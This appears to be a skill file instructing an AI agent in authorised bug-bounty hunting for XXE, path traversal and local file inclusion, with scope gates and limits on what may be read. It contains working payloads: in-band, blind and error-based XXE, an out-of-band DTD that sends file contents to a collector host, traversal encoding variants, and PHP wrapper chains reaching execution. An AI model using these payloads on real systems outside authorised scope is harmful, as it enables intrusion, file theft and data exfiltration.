---
name: zp-xxe-lfi
description: ZeroProtocol hunter for XML external entity injection, path traversal and local file inclusion. Use when XML, SVG, DOCX, XLSX or SOAP input is accepted, when a parameter contains a filename or path, when testing directory traversal, when an include or template path is user-controlled, or when hunting file read that escalates to RCE. Uses out-of-band channels for blind XXE and stops at proof of arbitrary read.
---

# zp-xxe-lfi - reading files you were not offered

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

Proof is **one** file whose content is unmistakable and harmless - `/etc/hostname`,
`/etc/passwd`, `win.ini`. Not the private keys, not the database config, not `/root/.ssh/`.
Arbitrary read is the finding; exercising it across the filesystem is exfiltration.

---

## XXE

**1. Find the XML surfaces.** They are more common than they look.

```
Content-Type: application/xml, text/xml, application/soap+xml
SVG upload (avatars, logos, diagrams) · DOCX/XLSX/PPTX/ODT (zip containers full of XML)
RSS/Atom import · SAML assertions · sitemap upload · XML-RPC · SOAP APIs
a JSON endpoint that also accepts XML - always try flipping the Content-Type
```

The Content-Type flip is worth its own test: many frameworks parse both and only the JSON path
was reviewed.

```bash
curl -sk -X POST "https://$H/api/import" -H 'Content-Type: application/xml' --data-binary @xxe.xml
```

**2. Classic in-band read.**

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY zp SYSTEM "file:///etc/hostname">]>
<r>&zp;</r>
```

**3. Blind XXE - out-of-band, because most real XXE is blind.**

```xml
<!-- step 1: the target fetches your DTD -->
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://xxe.COLLECTOR/e.dtd"> %ext;]>
<r>ok</r>
```

```xml
<!-- e.dtd, hosted on your collector - the content leaves in the HTTP query string,
     so this needs outbound HTTP from the target to you -->
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % w "<!ENTITY &#37; send SYSTEM 'http://xxe.COLLECTOR/?d=%f;'>">
%w; %send;
```

If the target resolves DNS but cannot reach you over HTTP, move the content into the hostname
instead - `<!ENTITY % send SYSTEM 'http://%f;.xxe.COLLECTOR/'>` - and read it out of your
authoritative log. Only label-safe content survives that: single line, no spaces, 63 bytes per
label, so it is `/etc/hostname`-sized proof and nothing longer.

A DNS or HTTP hit for `e.dtd` alone already proves external entity resolution. That is a
confirmed XXE; the exfiltration step only demonstrates the impact, and one small file is enough.

For files with newlines (which break URLs), try the error-based variant - the parser puts the
content into the exception text:

```xml
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % e "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%f;'>">
%e; %err;
```

This is not a general fallback: it only works where the processor embeds the unresolvable system
identifier in its exception **and** the app returns that exception to you - typical of
Java/Xerces with verbose errors, rare when errors are generic or when libxml (PHP, Python) is the
parser. Both declarations must live in the external DTD, not the internal subset. When the errors
come back generic, fall back to a single-line file (`/etc/hostname`) or, on PHP, wrap the read in
`php://filter/convert.base64-encode/resource=…` so the content is newline-free base64 - a quiet
target is not a patched one.

**4. SVG and Office documents** - the same bug wearing a friendly extension.

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY zp SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="5" y="30">&zp;</text>
</svg>
```

Rendered to PNG server-side, the file content appears **in the image**. For DOCX/XLSX: unzip,
inject the DOCTYPE into `word/document.xml` or `xl/workbook.xml`, rezip, upload.

**5. Other XML impacts.** XXE is not only file read: `http://` entities give you SSRF (go to
`zp-ssrf`); on PHP `expect://id` reaches execution, but only where the PECL expect extension is
loaded, which is rare. On the JVM the scheme is `jar:` with one colon and an inner URL -
`jar:http://xxe.COLLECTOR/x.zip!/f` - and it is **not** execution: it gives SSRF plus a
controlled temp-file write (an upload primitive on its own, and a DoS vector). Call it that in
the report; "RCE via jar:" is the overclaim a triager rejects.
**Never send a billion-laughs / quadratic-blowup payload** - that is a denial of service and it
is excluded by essentially every program.

---

## Path traversal / LFI

**6. Find the path sinks.**

```bash
grep -oiE '[?&](file|filename|path|dir|folder|doc|document|page|template|view|include|load|read|download|attachment|image|img|src|name|report|log|lang|locale|theme|module)=[^&]*' \
  surface/urls.txt | sort -u
```

**7. Walk the traversal ladder.**

```
../../../../etc/passwd
....//....//....//etc/passwd            (filter strips "../" once)
..%2f..%2f..%2fetc%2fpasswd              (URL encoded)
..%252f..%252f..%252fetc%252fpasswd      (double encoded - proxy decodes once, app twice)
%2e%2e%2f                                 (encoded dots)
..%c0%af..%c0%af                          (overlong UTF-8)
/etc/passwd                               (absolute, when the base is replaced not appended)
/var/www/html/../../../etc/passwd         (absolute + traversal)
....\\....\\windows\\win.ini              (Windows)
/etc/passwd%00.png                        (null byte - old PHP only)
/etc/passwd/.                             (trailing tricks)
....//  with mixed separators on Windows: ..\/..\/
```

If the app appends an extension (`$path . ".html"`), look for a file that ends with it, or a
null byte on ancient PHP, or a directory-listing path.

**8. PHP wrappers turn read into much more.**

```
php://filter/convert.base64-encode/resource=index.php     source disclosure, no execution
php://filter/read=string.rot13/resource=config.php        alternative when base64 is filtered
data://text/plain;base64,…                                needs allow_url_include
expect://id                                                RCE if the expect extension is loaded
php://input                                                POST body as the include source
zip://uploaded.zip%23shell.php                             chains with zp-upload
```

`php://filter` reading the application's own source is the highest-value LFI outcome short of
RCE - it hands you the config, the DB credentials and the authorization logic. **Read one file
to prove it, then stop and report.** Do not harvest credentials.

**9. Files worth exactly one read, as proof.**

```
/etc/hostname          smallest, cleanest proof - prefer this
/etc/passwd            the convention triagers expect
/proc/self/environ     process environment; often contains secrets - REDACT before attaching
/proc/self/cmdline     how the app was started
C:\Windows\win.ini     Windows equivalent
```

Do **not** read: `/etc/shadow`, `~/.ssh/id_rsa`, `.env`, `.aws/credentials`, database configs,
private keys. You do not need them, and having them in your notes is a liability for you and
the target.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| file content in the response | **confirmed arbitrary read.** High to Critical |
| DTD fetched from your collector | **confirmed XXE** even with no data returned |
| error message containing file content | confirmed blind XXE via the error channel |
| SVG renders with file content visible | confirmed, and a beautiful screenshot |
| `php://filter` returns base64 of app source | confirmed, High - arbitrary source disclosure (CVSS 7.5, `AV:N/AC:L/PR:N/UI:N/C:H`). Argue Critical only if the one proof file demonstrably holds a live secret granting further access - and redact it |
| traversal returns the *same* file regardless of depth | probably a normalised path. Killed |
| 500 on `../` | inconclusive - many frameworks reject any `..`. Keep going up the ladder |
| only files inside the intended directory are readable | not traversal. Killed |
| `http://` entity resolves but `file://` does not | that is SSRF, not file read -> `zp-ssrf` |
| the parser rejects all DOCTYPEs | correctly hardened. Killed - record the variants tried |
| you can read but only with a fixed extension appended | still a finding if any sensitive file matches. Otherwise Low |

---

## High-value patterns

- **SVG avatar upload rendered server-side** - the most common modern XXE, and the evidence is an image.
- **DOCX/XLSX import** in HR, finance and reporting features.
- **SAML assertion parsing** - XXE in the identity path, often pre-auth.
- **A JSON API that also accepts XML** - the XML branch was never reviewed.
- **`php://filter` on an include parameter** - source disclosure of the whole app.
- **Template/theme/locale selection parameters** - traversal into an include, which is LFI-to-RCE on PHP.
- **Log file inclusion** - LFI plus a controllable log line (User-Agent) is RCE on PHP.
- **Download-by-filename endpoints** in export features.

---

## Pitfalls

- **Billion laughs / quadratic blowup.** That is DoS. Excluded everywhere. Never.
- **Reading keys, shadow files or credential stores.** One harmless file is the proof.
- **Attaching `/proc/self/environ` unredacted** - it usually contains secrets.
- **Using a third-party collector** for the OOB DTD. Host it yourself.
- **Reporting `http://` entity resolution as file read.** It is SSRF; label it correctly.
- **Stopping at the first `..` rejection.** Encoding variants are most of this class.
- **Forgetting the Content-Type flip** on JSON endpoints.
- **Harvesting the whole source tree** via `php://filter`. One file, then report.
- **Leaving uploaded SVGs/DOCXs behind.** Delete them and say so.

---

## Hand off to

Confirmed -> `zp-triage`, `zp-report`. `http://` entities -> `zp-ssrf`.
Upload as the entry point -> `zp-upload`. LFI reaching an executable include, or
`expect://` -> `zp-rce-ssti`. Recovered source -> `zp-code-audit`.
Recovered secrets -> report the exposure, never use them.
